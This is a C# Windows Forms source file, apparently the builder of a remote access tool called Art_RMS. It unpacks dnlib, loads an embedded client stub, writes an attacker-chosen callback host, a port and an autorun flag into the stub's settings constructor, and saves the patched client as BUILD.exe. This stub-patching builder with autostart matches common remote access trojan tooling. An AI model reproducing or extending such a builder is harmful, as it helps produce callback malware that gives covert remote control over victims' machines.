using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Art_RMS.Properties;
using System.Text.RegularExpressions;

namespace Art_RMS.Forms
{
    public partial class Builder_Form : Form
    {
        public Builder_Form()
        {
            if (!File.Exists("dnlib.dll"))
            {
                File.WriteAllBytes("dnlib.dll", Resources.dnlib);
            }
            InitializeComponent();
        }

        private void Build_Click(object sender, EventArgs e)
        {
            string port = Regex.Match(port_textbox.Text, @"(^\d{1,5}$)").Groups[0].Value;
            if (dns_textbox.Text != "" && port != "")
            {
                var Assemblys = dnlib.DotNet.AssemblyDef.Load(Resources.stub);
                var Module = Assemblys.ManifestModule.GetTypes().Where(type => type.FullName == "Art_RMS_Client.Settings").FirstOrDefault();
                var Constructor = Module.FindMethod(".cctor");
                Constructor.Body.Instructions[0].Operand = dns_textbox.Text;
                Constructor.Body.Instructions[2].Operand = port;
                Constructor.Body.Instructions[4].Operand = autorun_check.Checked == true ? "true" : "false";
                Assemblys.Write("BUILD.exe");
            }
            else
                MessageBox.Show("Не все параметры введены верно!");
        }
    }
}
